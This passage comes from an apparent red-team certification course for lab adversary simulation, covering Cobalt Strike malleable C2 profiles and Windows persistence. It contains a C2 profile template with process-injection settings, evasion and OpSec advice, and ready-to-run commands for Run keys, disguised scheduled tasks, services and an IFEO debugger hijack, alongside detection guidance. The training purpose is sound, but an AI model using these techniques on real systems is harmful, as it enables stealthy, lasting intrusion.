defenders.</p>\n</li>\n<li><p><strong><code>killdate</code>:</strong> A vital OpSec setting! This defines a date and time after which the implant will <em>stop</em> calling back. This prevents your implants from living forever in a network, potentially being discovered months later after your engagement is over or your infrastructure is gone.</p>\n<pre><code>set killdate &quot;01/01/2025&quot;; # Implant stops calling back after January 1, 2025\n</code></pre>\n</li>\n</ul>\n<p><strong>Practical Tip:</strong> Choose a <code>sleep</code> time appropriate for the required responsiveness vs. stealth. For initial access and persistence, a longer sleep (30s-5m) is often acceptable and stealthier. For interactive command execution, you might temporarily lower it, but be aware of the increased risk. Always use <code>jitter</code>! Always set a <code>killdate</code>.</p>\n<h4>7.5 Understanding Sacrificial Processes</h4>\n<p>This subtopic is about <em>where</em> your implant code runs on the target system, and how the profile can influence this for evasion.</p>\n<p>When your initial payload executes (like we did in Module 5), it runs within a process. If it&#39;s a simple executable, it runs in its own process (<code>payload.exe</code>). If it&#39;s a script executed by <code>mshta</code> or <code>powershell</code>, it runs within that process.</p>\n<p>However, security tools pay close attention to processes: their names, their command lines, their parent processes, and the network connections they make. A process like <code>cmd.exe</code> or <code>powershell.exe</code> making a network connection to a strange IP is suspicious. A custom executable running with a weird name is also suspicious.</p>\n<p><strong>Sacrificial Process Concept:</strong> Instead of the main implant code running directly in the initial execution process (which might be flagged), the implant can <em>spawn</em> a new, legitimate-looking process (a &quot;sacrificial&quot; process) and <em>inject</em> its code into that process. The network communication then originates from the <em>sacrificial</em> process, making it harder to attribute the malicious traffic to the initial execution vector.</p>\n<p><strong>Why it aids Evasion:</strong></p>\n<ol>\n<li><strong>Process Hiding:</strong> The malicious code is now running inside <code>explorer.exe</code>, <code>svchost.exe</code>, <code>dllhost.exe</code>, or another common Windows process. This is much less suspicious than a standalone <code>beacon.exe</code> or a <code>powershell</code> process with a long, encoded command line making a network connection.</li>\n<li><strong>Network Connection Blending:</strong> The network connection appears to originate from a process that <em>legitimately</em> makes network connections, making it harder to spot among normal activity.</li>\n</ol>\n<p><strong>How Profiles Help:</strong> Malleable C2 profiles often have settings to control <em>which</em> process the implant should spawn and inject into.</p>\n<pre><code># Example (Simplified Cobalt Strike Syntax)\n\nprocess-inject {\n    set spwan_to { # Define where to inject\n        # Use a common, legitimate process, potentially varying based on architecture (x86/x64)\n        # Note: The actual process list depends on the OS version and installed software\n        # Common examples: explorer.exe, svchost.exe, dllhost.exe, powershell.exe (though powershell is often monitored)\n        x64 &quot;%windir%\\\\syswow64\\\\explorer.exe&quot;;\n        x86 &quot;%windir%\\\\system32\\\\explorer.exe&quot;;\n    }\n    # ... other injection settings (how to inject) ...\n}\n</code></pre>\n<p><strong>Key Takeaway:</strong> While the <em>mechanics</em> of process injection are complex (and beyond the scope of this foundational module), understanding that implants often run inside other processes <em>for stealth</em> and that your C2 profile can <em>specify</em> which process to use is important. Choosing a sacrificial process that is common and expected to make network connections improves stealth.</p>\n<h4>7.6 Basic OpSec Considerations for C2 Communications</h4>\n<p>Operational Security isn&#39;t just about traffic profiles; it&#39;s about the entire lifecycle and visibility of your C2.</p>\n<ul>\n<li><strong>Use Redirectors (Module 3 Recap):</strong> Your C2 server shouldn&#39;t have direct inbound connections from implants. Redirectors protect your actual C2 server&#39;s IP address. If a redirector gets blocked or investigated, you can pivot to a new one without losing your entire operation.</li>\n<li><strong>Use HTTPS with Valid Certificates:</strong> Network defenders often filter or inspect non-HTTPS traffic. Using HTTPS encrypts the <em>contents</em> of your C2 communication, making it harder to see the commands and data being transferred. Using a certificate (even a free Let&#39;s Encrypt cert or a self-signed one <em>for testing</em>) makes the initial TLS handshake look more legitimate than a connection to a raw IP or a site with certificate errors (though advanced defenders <em>do</em> check certificate details).</li>\n<li><strong>Avoid Default Profile Values:</strong> Don&#39;t use the built-in default profile of your C2 framework. Defenders know these defaults and actively look for them.</li>\n<li><strong>Test Your Profile:</strong> Before using a profile in a simulation, test it!<ul>\n<li>Run an implant using the profile in your lab.</li>\n<li>Use Wireshark on your redirector/C2 to inspect the traffic. Does it look like you intended? Are the headers correct? Is the timing variable?</li>\n<li>Check your SIEM (Module 2) logs. Does the network connection from the implant&#39;s process look suspicious? Are there any immediate alerts based on the connection details?</li>\n</ul>\n</li>\n<li><strong>DNS:</strong> If using domain names, ensure they aren&#39;t on public blacklists. Consider using domain generation algorithms (DGAs) or fast flux (more advanced topics) in real ops, but for simulation, a clean, non-suspicious domain is key.</li>\n<li><strong>Infrastructure Lifespan:</strong> Don&#39;t use the same infrastructure (IPs, domains) across multiple, unrelated engagements. Burn down infrastructure after an operation or if you suspect it&#39;s been detected.</li>\n</ul>\n<h4>7.7 Analyzing C2 Traffic</h4>\n<p>How do we know if our profile is working? We look at the traffic and the logs!</p>\n<ul>\n<li><strong>Wireshark (or tcpdump):</strong> Run a packet capture on your redirector or C2 server&#39;s network interface. Filter for traffic on the port your C2 is listening on.<ul>\n<li><strong>What to look for:</strong><ul>\n<li><strong>Destination IP/Port:</strong> Should be your redirector/C2.</li>\n<li><strong>HTTP/S Requests:</strong><ul>\n<li><strong>User-Agent:</strong> Does it match your profile?</li>\n<li><strong>Headers:</strong> Are the headers you specified present? Do they look normal? Are there any unexpected headers?</li>\n<li><strong>URI Path:</strong> Does it match your <code>set uri</code>?</li>\n<li><strong>Request Method (GET/POST):</strong> Does it match your profile configuration?</li>\n<li><strong>Data (if not HTTPS or if you decrypt):</strong> Is the data encoded/encrypted as expected?</li>\n</ul>\n</li>\n<li><strong>Timings:</strong> Are the connections happening at fixed intervals, or is there <code>jitter</code>?</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><strong>SIEM (Splunk/ELK from Module 2):</strong> Look at the logs generated on the <em>target</em> machine.<ul>\n<li><strong>Sysmon Event ID 1 (Process Creation):</strong> What process initiated the network connection? If using sacrificial processes, is it the expected legitimate process? Look at the command line of the process – does it look normal?</li>\n<li><strong>Sysmon Event ID 3 (Network Connection):</strong> What is the source process, destination IP/port, and protocol? Does the destination IP/port match your C2? Does the process name look suspicious making that connection?</li>\n<li><strong>Windows Security Event ID 4688 (Process Creation - requires auditing):</strong> Similar to Sysmon 1, shows process creation and command line.</li>\n<li><strong>Firewall Logs:</strong> Any blocks? Any detections based on IP or domain?</li>\n<li><strong>Web Proxy Logs (if applicable in a real environment):</strong> These logs are gold for defenders, showing the full HTTP request details (UA, headers, URIs). This is why profile malleability is essential.</li>\n</ul>\n</li>\n</ul>\n<p>By analyzing the traffic and logs, you can verify that your profile is being applied correctly and see what a defender <em>might</em> see. This helps you refine your profile for better stealth.</p>\n<hr>\n<h4>Suggested Resources or Prerequisites (Recap):</h4>\n<ul>\n<li>Basic understanding of HTTP/HTTPS requests and responses (headers, methods, URIs).</li>\n<li>Familiarity with text configuration files.</li>\n<li>Access to a C2 framework that supports malleable profiles (Cobalt Strike trial, Mythic, or Sliver are good examples to <em>study</em> the profile concepts, even if not used for the full capstone build).</li>\n<li>Sample Malleable C2 profiles (e.g., from Cobalt Strike&#39;s GitHub repo - search for &quot;malleable-c2&quot;).</li>\n<li>A tool for inspecting network traffic like Wireshark (optional but highly recommended).</li>\n</ul>\n<hr>\n<h4>Module Project/Exercise:</h4>\n<p>Alright, hands-on time! Let&#39;s get a feel for how these profiles actually look and work.</p>\n<p><strong>Project 7.1: Configure a Basic Malleable Profile</strong></p>\n<p>The goal here is to take a standard profile structure and modify key elements to change the fingerprint of our C2 communication. We&#39;ll use the structure inspired by Cobalt Strike profiles as the learning example, as they are widely available for study.</p>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Obtain a Sample Profile Structure:</strong> You can find numerous examples online by searching for &quot;Cobalt Strike malleable C2 profiles GitHub&quot;. Look for a relatively simple HTTP-based profile. You don&#39;t need the C2 framework itself to <em>read</em> and <em>modify</em> the text file.</p>\n<ul>\n<li><em>Instructor Note:</em> A good starting point for learners is often the sample profiles provided in Cobalt Strike&#39;s official documentation or repositories. We&#39;ll use a simplified template here for our exercise.</li>\n</ul>\n<p>Create a new text file named <code>my_basic_profile.profile</code> and paste the following <em>basic template</em> into it:</p>\n<pre><code># This is a basic template for learning malleable profile concepts\n# Based on Cobalt Strike syntax\n\nhttp-get {\n    set uri &quot;/query&quot;; # Default check-in URI\n\n    client {\n        header &quot;User-Agent&quot; &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;; # Default UA\n        # Add other default headers if they exist in your base template\n\n        metadata {\n            base64;\n            header &quot;Cookie&quot;;\n        }\n    }\n\n    server {\n        header &quot;Server&quot; &quot;Microsoft-IIS/7.5&quot;; # Default Server header\n        output {\n            base64;\n            print;\n        }\n    }\n}\n\nhttp-post {\n    set uri &quot;/submit&quot;; # Default data submission URI\n\n    client {\n        header &quot;User-Agent&quot; &quot;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)&quot;; # Default UA\n        # Add other default headers\n\n        id {\n            parameter &quot;id&quot;;\n        }\n        output {\n            base64;\n            parameter &quot;data&quot;;\n        }\n    }\n\n    server {\n        header &quot;Server&quot; &quot;Microsoft-IIS/7.5&quot;; # Default Server header\n        output {\n            print &quot;OK&quot;;\n        }\n    }\n}\n\n# Global options\nset sleep &quot;60&quot;; # Default sleep 60 seconds\nset jitter &quot;0&quot;; # Default jitter 0%\nset killdate &quot;01/01/2030&quot;; # Default distant killdate\n\n# Process Injection (simplified - specific techniques are complex)\nprocess-inject {\n    set spwan_to {\n        x64 &quot;%windir%\\\\syswow64\\\\notepad.exe&quot;; # Default injection target\n        x86 &quot;%windir%\\\\system32\\\\notepad.exe&quot;; # Default injection target\n    }\n    # ... other injection settings\n}\n</code></pre>\n</li>\n<li><p><strong>Modify the Profile:</strong> Edit the <code>my_basic_profile.profile</code> file. Apply the following changes:</p>\n<ul>\n<li><strong>Change User Agent:</strong> In <em>both</em> the <code>http-get</code> and <code>http-post</code> client sections, change the <code>User-Agent</code> header to mimic a recent version of Chrome or Firefox on Windows.<ul>\n<li><em>Example Chrome UA:</em> <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</code></li>\n<li><em>Example Firefox UA:</em> <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0</code></li>\n<li><em>Choose one and replace the default.</em></li>\n</ul>\n</li>\n<li><strong>Change URIs:</strong> In the <code>http-get</code> section, change <code>/query</code> to something less generic, like <code>/news/feed.xml</code> or <code>/api/v2/status</code>. In the <code>http-post</code> section, change <code>/submit</code> to something like <code>/data/upload</code> or <code>/results.php</code>.</li>\n<li><strong>Add a Referer Header (http-get):</strong> In the <code>http-get</code> client section, add a <code>Referer</code> header to make it look like the request came from a common search engine or a corporate portal URL (e.g., <code>https://www.google.com/</code> or <code>https://portal.mycompany.com/</code>).</li>\n<li><strong>Set Sleep and Jitter:</strong> Change the <code>sleep</code> setting to a more realistic value (e.g., <code>30</code> seconds or <code>60</code> seconds). Change the <code>jitter</code> setting to a significant percentage (e.g., <code>25</code> or <code>30</code>).<ul>\n<li><em>Example:</em> <code>set sleep &quot;45&quot;;</code> <code>set jitter &quot;30&quot;;</code></li>\n</ul>\n</li>\n<li><strong>Set a Realistic Killdate:</strong> Change the <code>killdate</code> to a date a week or two in the future.<ul>\n<li><em>Example:</em> <code>set killdate &quot;07/15/2023&quot;;</code> (Use a date relevant to when you are doing the exercise).</li>\n</ul>\n</li>\n<li><strong>Change Sacrificial Process (Optional but Recommended):</strong> In the <code>process-inject</code> section&#39;s <code>spawn_to</code>, change <code>notepad.exe</code> to <code>explorer.exe</code> or <code>dllhost.exe</code>. <em>Note: Be cautious changing this in a live environment without testing, as some processes are more stable targets than others. For this exercise, simply changing the string is sufficient to understand the concept.</em></li>\n</ul>\n</li>\n<li><p><strong>Analyze the Profile Syntax and Effect:</strong> Review your modified <code>my_basic_profile.profile</code> file. Write a brief summary (a few sentences for each) explaining:</p>\n</li>\n</ol>\n\n                </div>\n             </div>\n         ",
    "module-8": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 8: module_8</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright team, pull up a chair! We&#39;ve built our lab, set up our initial comms infrastructure, crafted our first payload, and even achieved initial execution and callback while thinking about evasion. That&#39;s huge! You&#39;ve gotten the door open, maybe even wedged your foot in.</p>\n<p>But here&#39;s the thing about doors – they can slam shut. Systems reboot, users log off, processes crash, defenders find and kill your initial shell. If your access is tied <em>only</em> to that one-time execution, you&#39;ve lost your beachhead.</p>\n<p>This is where <strong>Persistence</strong> comes in. It&#39;s about ensuring that even if the system restarts or your initial process dies, you have a way back in. It&#39;s securing that toehold, making it resilient. This module is all about understanding <em>where</em> adversaries hide their access mechanisms and <em>how</em> to set them up so we can simulate that crucial phase. Let&#39;s make our access sticky!</p>\n<hr>\n<h2>CRTO Prep Part 1, Module 8: Initial Persistence Engineering</h2>\n<p><strong>Module Objective:</strong> By the end of this module, learners will be able to identify common persistence locations on Windows systems and implement several basic techniques to maintain access after a reboot or user logout.</p>\n<hr>\n<h3>8.1 Understanding Persistence: Why and What</h3>\n<ul>\n<li><strong>What is Persistence?</strong><ul>\n<li>In adversary simulation (and real attacks), persistence refers to the techniques adversaries use to maintain access to systems across restarts, changes in credentials, and other interruptions that would otherwise cut off their access.</li>\n<li>Think of it as leaving a backdoor open, but one that automatically re-opens itself.</li>\n</ul>\n</li>\n<li><strong>Why is Persistence Necessary?</strong><ul>\n<li><strong>Maintaining Access:</strong> The most critical reason. Initial access vectors (like phishing links, exploited vulnerabilities) are often one-time events. Persistence ensures continued access to the target environment over days, weeks, or months.</li>\n<li><strong>Resilience:</strong> If a compromised process is killed or the system reboots, persistence mechanisms automatically re-execute the malicious code.</li>\n<li><strong>Escalation:</strong> Persistence techniques can sometimes be combined with privilege escalation (covered in later modules) to ensure continued high-level access.</li>\n</ul>\n</li>\n<li><strong>Persistence Categories (High-Level):</strong><ul>\n<li><strong>Execution Persistence:</strong> Ensuring malicious code runs automatically (e.g., on logon, system boot, scheduled time). This is our primary focus in this module.</li>\n<li><strong>Privilege Persistence:</strong> Maintaining elevated privileges (often overlaps with Execution Persistence if the execution method runs with high privileges).</li>\n<li><strong>Account Persistence:</strong> Creating or compromising legitimate accounts.</li>\n<li><strong>Configuration Persistence:</strong> Modifying system configurations to aid future access (e.g., firewall rules, RDP settings).</li>\n<li><em>For the CRTO and this module, we&#39;ll focus heavily on <strong>Execution Persistence</strong> using common Windows features.</em></li>\n</ul>\n</li>\n</ul>\n<h3>8.2 Common Persistence Locations on Windows</h3>\n<p>Windows provides many legitimate ways for applications and users to start programs automatically. Adversaries abuse these same mechanisms to achieve persistence. Understanding these locations is key to both implementing and detecting persistence.</p>\n<p>Let&#39;s explore some of the most common ones:</p>\n<h4>8.2.1 Startup Folders</h4>\n<ul>\n<li><strong>Location:</strong><ul>\n<li><code>C:\\Users\\&lt;Username&gt;\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code> (User-specific)</li>\n<li><code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code> (All Users)</li>\n</ul>\n</li>\n<li><strong>How it Works:</strong> Any executable, script, or even a shortcut (<code>.lnk</code>) placed in these folders will be executed automatically when the user logs in.</li>\n<li><strong>Adversary Use:</strong> Simplest method. Drop a malicious executable, script, or a shortcut pointing to one of these locations.</li>\n<li><strong>OpSec Consideration:</strong> Very high visibility. Easy for a user browsing their Start Menu or for security tools scanning known locations. Not ideal for stealthy operations.</li>\n</ul>\n<h4>8.2.2 Run and RunOnce Registry Keys</h4>\n<ul>\n<li><strong>Location:</strong><ul>\n<li><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> (User-specific, runs on logon)</li>\n<li><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code> (All Users, runs on boot/logon)</li>\n<li><code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> (User-specific, runs <em>once</em> on logon, then the entry is deleted)</li>\n<li><code>HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code> (All Users, runs <em>once</em> on boot/logon, then deleted)</li>\n</ul>\n</li>\n<li><strong>How it Works:</strong> Programs listed in these keys (as <code>REG_SZ</code> or <code>REG_EXPAND_SZ</code> values pointing to an executable path) are automatically launched by <code>explorer.exe</code> during the user logon process (<code>Run</code>) or by <code>winlogon.exe</code> during boot/logon (<code>RunOnce</code>).</li>\n<li><strong>Adversary Use:</strong> A very common and effective method. Add a registry value pointing to your payload or a launcher script. <code>RunOnce</code> is useful for single-execution tasks or staging. <code>Run</code> is for persistent execution.</li>\n<li><strong>OpSec Consideration:</strong> Less visible to a casual user than Startup folders, but easily found by security tools scanning known registry locations. Naming the value something that blends in is crucial.</li>\n<li><strong>Practical Example (Adding to HKCU Run):</strong><pre><code class=\"language-cmd\">reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;MyAwesomeService&quot; /t REG_SZ /d &quot;C:\\Users\\Public\\my_payload.exe&quot; /f\n</code></pre>\n<ul>\n<li><code>/v &quot;MyAwesomeService&quot;</code>: Sets the value name (choose something less obvious!).</li>\n<li><code>/t REG_SZ</code>: Specifies the data type.</li>\n<li><code>/d &quot;C:\\Users\\Public\\my_payload.exe&quot;</code>: Sets the command to run.</li>\n<li><code>/f</code>: Forces overwrite if the value exists.</li>\n</ul>\n</li>\n<li><strong>Practical Example (Adding to HKLM Run - Requires Admin):</strong><pre><code class=\"language-cmd\">reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v &quot;SystemUpdateService&quot; /t REG_SZ /d &quot;%ProgramFiles%\\Common Files\\update.exe&quot; /f\n</code></pre>\n<ul>\n<li>Note the use of <code>%ProgramFiles%</code> for better blending.</li>\n</ul>\n</li>\n</ul>\n<h4>8.2.3 Scheduled Tasks</h4>\n<ul>\n<li><strong>Location:</strong> Configured and managed via the Task Scheduler GUI (<code>taskschd.msc</code>) or command-line tools (<code>schtasks.exe</code>, PowerShell <code>*-ScheduledTask</code> cmdlets). Task definitions are stored in XML files in <code>C:\\Windows\\System32\\Tasks</code>.</li>\n<li><strong>How it Works:</strong> Allows scheduling programs or scripts to run at specific times, intervals, or in response to specific events (like system startup, user logon, or even on idle). Can be configured to run with different user privileges, including SYSTEM, even if no user is logged in.</li>\n<li><strong>Adversary Use:</strong> Extremely versatile and powerful. Can run payloads with high privileges, at specific times to avoid detection, or triggered by events that blend in (e.g., on network connection, workstation unlock). Can hide the task window.</li>\n<li><strong>OpSec Consideration:</strong> Less obvious than Run keys unless an administrator actively checks Task Scheduler. Naming and triggers are key OpSec factors. Running as SYSTEM is powerful but might stand out if the payload isn&#39;t designed for it.</li>\n<li><strong>Practical Example (Creating a Basic Task with <code>schtasks.exe</code>):</strong><pre><code class=\"language-cmd\">schtasks /create /tn &quot;Microsoft\\Windows\\Defrag\\DiskCleanup&quot; /tr &quot;C:\\Users\\Public\\cleanup.bat&quot; /sc ONLOGON /ru %USERNAME% /f\n</code></pre>\n<ul>\n<li><code>/tn &quot;Microsoft\\Windows\\Defrag\\DiskCleanup&quot;</code>: Task Name. Placing it under a legitimate-looking path (<code>Microsoft\\Windows\\Defrag</code>) helps blend in.</li>\n<li><code>/tr &quot;C:\\Users\\Public\\cleanup.bat&quot;</code>: Task Run - the command/script to execute.</li>\n<li><code>/sc ONLOGON</code>: Schedule Type - runs when the user logs on. Other options: <code>ONSTART</code> (system boot), <code>DAILY</code>, <code>WEEKLY</code>, <code>ONIDLE</code>, <code>ONEVENT</code>.</li>\n<li><code>/ru %USERNAME%</code>: Run As User - runs as the current logged-in user. Can specify a different user or <code>SYSTEM</code>. Requires <code>/rp</code> (password) if not current user or SYSTEM.</li>\n<li><code>/f</code>: Force creation (overwrites if exists).</li>\n</ul>\n</li>\n<li><strong>Practical Example (Creating a Task with PowerShell):</strong><pre><code class=\"language-bash\">$Action = New-ScheduledTaskAction -Execute &#39;C:\\Users\\Public\\update_check.ps1&#39;\n$Trigger = New-ScheduledTaskTrigger -AtStartup\nRegister-ScheduledTask -TaskName &quot;WindowsUpdateCheck&quot; -Action $Action -Trigger $Trigger -Description &quot;Checks for Windows updates silently.&quot;\n</code></pre>\n<ul>\n<li>More verbose but offers greater flexibility and is often preferred in scripting. This example creates a task that runs a PowerShell script at system startup.</li>\n</ul>\n</li>\n</ul>\n<h4>8.2.4 Services</h4>\n<ul>\n<li><strong>Location:</strong> Managed via <code>services.msc</code>, <code>sc.exe</code>, or PowerShell cmdlets (<code>Get-Service</code>, <code>New-Service</code>, etc.). Service configurations are stored in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>.</li>\n<li><strong>How it Works:</strong> Services are applications that run in the background, often starting at system boot before any user logs in. They can run with various privileges, including SYSTEM.</li>\n<li><strong>Adversary Use:</strong> Installing a malicious executable as a service allows it to run automatically with high privileges from boot-up. Can be configured for automatic restart on failure.</li>\n<li><strong>OpSec Consideration:</strong> Requires administrator privileges to install a new service. While powerful, creating a new service might trigger alerts. Modifying an existing service is stealthier but riskier. Naming and description are key OpSec factors.</li>\n<li><strong>Conceptual Overview (Implementation is more involved):</strong> An adversary would typically drop a malicious executable (often a DLL or EXE designed to run as a service) and then use <code>sc.exe</code> or PowerShell <code>New-Service</code> to register it as a service.<pre><code class=\"language-cmd\">REM Conceptual: This requires a specially crafted executable\nsc create MyBackgroundWorker binPath=&quot;C:\\Program Files\\Common Files\\worker.exe&quot; start=auto DisplayName=&quot;My Background Worker&quot;\n</code></pre>\n</li>\n<li><em>Note: For this foundational module and CRTO, understanding the <em>concept</em> and <em>detection</em> of service persistence is more critical than hands-on implementation of creating a complex service executable.</em></li>\n</ul>\n<h4>8.2.5 Office Macro Persistence</h4>\n<ul>\n<li><strong>How it Works:</strong> Malicious VBA code embedded in Office documents can be configured to run automatically when the document is opened (e.g., using <code>Auto_Open</code>, <code>Document_Open</code> functions).</li>\n<li><strong>Adversary Use:</strong> Primarily used for initial access, but can also be used for persistence by modifying template files (like <code>Normal.dotm</code> in Word) or adding macros that re-enable themselves or drop other persistence mechanisms.</li>\n<li><strong>OpSec Consideration:</strong> Relies on the user opening the document. Detected by AV/EDR scanning documents and VBA code. Requires users to enable macros (though social engineering or bypassing Trust Center settings can overcome this).</li>\n</ul>\n<h4>8.2.6 Registry Hijacking (<code>AppInit_DLLs</code>, <code>IFEO</code>, etc.)</h4>\n<ul>\n<li><strong>How it Works:</strong> Certain legitimate registry keys control how Windows loads libraries or executes processes. Adversaries modify these keys to inject their own code into legitimate processes.<ul>\n<li><code>AppInit_DLLs</code> (<code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>): Specifies a list of DLLs that <code>user32.dll</code> loads into every process that loads <code>user32.dll</code> (which is most GUI applications). Requires administrator privileges. Less effective/common in modern Windows versions with Secure Boot and code signing requirements.</li>\n<li><code>Image File Execution Options (IFEO)</code> (<code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\&lt;ProcessName.exe&gt;</code>): Originally for developers (e.g., attaching debuggers). Adversaries can set the <code>Debugger</code> value to the path of their payload. When <code>&lt;ProcessName.exe&gt;</code> is launched, the debugger (the malicious payload) is launched instead. Can be set per-user in <code>HKCU</code>.</li>\n</ul>\n</li>\n<li><strong>Adversary Use:</strong> Injecting code into common, legitimate processes makes it harder to detect the malicious code itself. Can achieve high privileges depending on the target process and registry key location.</li>\n<li><strong>OpSec Consideration:</strong> Modifying these critical registry keys is highly suspicious and monitored by security software. Requires careful targeting and often code signing or bypass techniques.</li>\n<li><strong>Practical Example (IFEO Debugger - Requires Admin for HKLM):</strong><pre><code class=\"language-cmd\">REM This will launch C:\\malware\\payload.exe whenever notepad.exe is launched SYSTEM-WIDE\nreg add &quot;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\\malware\\payload.exe&quot; /f\n</code></pre>\n<ul>\n<li><em>Note: Be extremely careful with IFEO on critical system processes!</em></li>\n</ul>\n</li>\n</ul>\n<h4>8.2.7 Abusing MSI/Installer Packages (Conceptual)</h4>\n<ul>\n<li><strong>How it Works:</strong> Windows Installer (<code>msiexec.exe</code>) processes <code>.msi</code> files, which can include custom actions.</li>\n<li><strong>Adversary Use:</strong> Adversaries can craft malicious MSI packages or modify legitimate ones to execute code during installation or uninstallation. This can be used for initial execution <em>or</em> persistence if the package is designed to run on startup or triggers other persistence mechanisms.</li>\n<li><strong>OpSec Consideration:</strong> Requires getting the user/system to install the package. Custom actions can be detected.</li>\n</ul>\n<h3>8.3 OpSec Considerations for Persistence</h3>\n<p>Choosing and implementing a persistence mechanism isn&#39;t just about <em>making it work</em>; it&#39;s about <em>making it stealthy</em>.</p>\n<ul>\n<li><strong>Blend In:</strong><ul>\n<li><strong>File Names &amp; Paths:</strong> Use names and locations that look legitimate (e.g., <code>update.exe</code>, <code>cleanup.bat</code> in <code>C:\\ProgramData</code>, <code>C:\\Users\\Public</code>, <code>%APPDATA%</code>, <code>%TEMP%</code>, or fake directories under <code>Program Files</code> or <code>Windows</code>). Avoid obvious names like <code>malware.exe</code> or paths like <code>C:\\temp\\payload</code>.</li>\n<li><strong>Registry Value/Task Names:</strong> Choose names that mimic legitimate software or system tasks (e.g., &quot;Microsoft Update Helper&quot;, &quot;Adobe Synchronization&quot;, &quot;System Performance Monitor&quot;). Place Scheduled Tasks under legitimate-looking folders (<code>Microsoft\\Windows\\...\\</code>).</li>\n<li><strong>Service Names/Descriptions:</strong> Similar to task names, use plausible names and descriptions.</li>\n</ul>\n</li>\n<li><strong>Use LOLBAS:</strong> Whenever possible, use built-in Windows binaries (<code>schtasks.exe</code>, <code>reg.exe</code>, <code>powershell.exe</code>, <code>cmd.exe</code>, <code>mshta.exe</code>, <code>rundll32.exe</code>) to execute your payload or launcher. This makes the <em>process execution</em> look legitimate, shifting the focus to the <em>command line arguments</em> and <em>network connections</em>.</li>\n<li><strong>Understand Execution Context:</strong> Will your persistence mechanism run as the user, Administrator, or SYSTEM? Ensure your payload/launcher is compatible and that the chosen context aligns with your goals (e.g., SYSTEM for high privilege, user for blending in with normal user activity).</li>\n<li><strong>Minimize Footprint:</strong> Only set up the persistence you need. Clean up temporary files or unnecessary registry entries.</li>\n<li><strong>Test Detection:</strong> <em>Crucially</em>, test your chosen persistence method in your lab environment (Module 2) and observe the logs (Module 2) and any security controls (Module 6) to understand how visible it is.</li>\n</ul>\n<h3>8.4 Detecting Persistence Mechanisms</h3>\n<p>This ties directly back to Module 2 and your lab setup. Defenders look for anomalies in the locations we just discussed. Your SIEM should be configured to ingest logs that reveal these activities.</p>\n<ul>\n<li><strong>Sysmon (Critical!):</strong><ul>\n<li><strong>Event ID 1 (Process Creation):</strong> Look for suspicious processes launching from unusual locations (Startup folders, temp directories) or suspicious parent-child relationships (e.g., <code>explorer.exe</code> launching something unusual, <code>svchost.exe</code> launching a non-service executable if you used services).</li>\n<li><strong>Event ID 12, 13, 14 (Registry Events):</strong> Monitor modifications to known persistence keys (<code>Run</code>, <code>RunOnce</code>, Service configuration keys, IFEO keys, <code>AppInit_DLLs</code>). Look for suspicious value names and data.</li>\n<li><strong>Event ID 3 (Network Connection):</strong> Your persisted payload will likely try to call back to your C2. Monitor network connections originating from suspicious processes or processes with suspicious command lines.</li>\n<li><strong>Event ID 15 (FileCreateStreamHash):</strong> Can potentially log creation of files in Startup folders, though less direct than process creation.</li>\n</ul>\n</li>\n<li><strong>Windows Security Logs:</strong><ul>\n<li><strong>Event ID 4688 (Process Creation):</strong> Similar to Sysmon Event ID 1, but built-in. Less detail by default, but still useful, especially if command line logging is enabled via GPO.</li>\n<li><strong>Event ID 4698 (A scheduled task was created):</strong> Excellent for detecting <code>schtasks.exe</code> or PowerShell creation of tasks. Includes task name, command, and trigger details.</li>\n<li><strong>Event ID 4702 (A scheduled task was updated):</strong> Useful for detecting modifications to existing tasks.</li>\n<li><strong>Event ID 4624 (Successful Logon):</strong> Can be correlated with processes starting on logon (Startup, Run keys).</li>\n</ul>\n</li>\n<li><strong>Task Scheduler Logs:</strong> Dedicated logs for Task Scheduler events provide detail on task creation, registration, execution, and errors.</li>\n<li><strong>Registry Auditing:</strong> Configure SACLs (System Access Control Lists) and Windows Auditing to log access/modification attempts on specific, critical registry keys. This generates Security Event IDs like 4657 (A registry value was modified).</li>\n</ul>\n<p>By simulating persistence and then analyzing the logs in your SIEM, you gain invaluable insight into what defenders see and how to make your simulation more realistic or stealthy.</p>\n<hr>\n<h3>Module Project/Exercise: Implement Initial Persistence</h3>\n<p>Alright, time to get hands-on and make our access stick! We&#39;ll take the access we established in Module 5 (or simulate having it by running a command directly on the target VM) and set up a persistence mechanism that calls back to our C2 infrastructure from Module 3.</p>\n<p><strong>Goal:</strong> Implement one basic persistence technique (Scheduled Task or Run Key recommended) on your target Windows client VM that survives a reboot and attempts to re-establish a connection or execute a command pointing towards your C2 redirector. Then, analyze the logs in your SIEM.</p>\n<p><strong>Prerequisites:</strong></p>\n<ul>\n<li>Your lab environment is running (DC, Client VM - Module 2).</li>\n<li>Your C2 infrastructure (redirector, simple payload hosting) is operational (Module 3).</li>\n<li>You have a test payload or command ready that attempts to connect back to your C2 (Module 4/5). This could be a simple PowerShell script using <code>Invoke-WebRequest</code> or <code>curl</code> to hit your redirector, or a more complex stager/payload. <em>Keep it simple for this test, focusing on the persistence trigger.</em></li>\n</ul>\n<p><strong>Steps:</strong></p>\n<ol>\n<li><p><strong>Choose Your Persistence 